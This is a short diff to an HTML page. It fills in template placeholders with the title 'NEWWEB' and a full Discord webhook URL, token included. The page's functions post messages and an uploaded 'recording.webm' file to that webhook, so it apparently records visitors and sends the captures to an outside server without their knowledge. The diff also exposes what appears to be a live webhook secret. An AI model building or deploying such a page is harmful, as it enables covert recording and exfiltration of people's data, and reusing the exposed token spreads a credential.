@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ここにたいとる</title>
+    <title>NEWWEB</title>
     <style>
         body {
             margin: 0;
@@ -73,7 +73,7 @@
         }
 
         function sendToDiscordWebhook(message) {
-            fetch('ここにwebhook下と同じにしてｎ', {
+            fetch('https://discord.com/api/webhooks/1324443808242339933/YnJ9KIGP0SLeyqvTZW-PdrGF0mGztzSyChwK4VVK_RKh26x5oUEX3tV6dOAb2bxUKWMa', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -89,7 +89,7 @@
             const formData = new FormData();
             formData.append('file', blob, 'recording.webm');
 
-            fetch('ここにwebhook上と同じにしてｎ', {
+            fetch('https://discord.com/api/webhooks/1324443808242339933/YnJ9KIGP0SLeyqvTZW-PdrGF0mGztzSyChwK4VVK_RKh26x5oUEX3tV6dOAb2bxUKWMa', {
                 method: 'POST',
                 body: formData
             })
